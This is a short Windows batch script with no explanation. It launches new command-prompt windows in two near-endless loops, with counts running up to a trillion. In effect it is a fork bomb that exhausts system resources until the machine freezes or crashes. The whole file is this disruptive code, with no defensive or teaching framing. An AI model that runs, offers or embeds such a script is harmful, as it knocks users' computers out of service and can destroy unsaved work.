timeout /t 0 >nul
@echo off
for /l %%i in (50,100,1000000000000) do (
    start cmd
)
@echo off
set COUNT=0
set LIMIT=1000000000000

:loop
if %COUNT% GEQ %LIMIT% goto end
start cmd
set /a COUNT+=10
goto loop

:end
echo Done.
pause
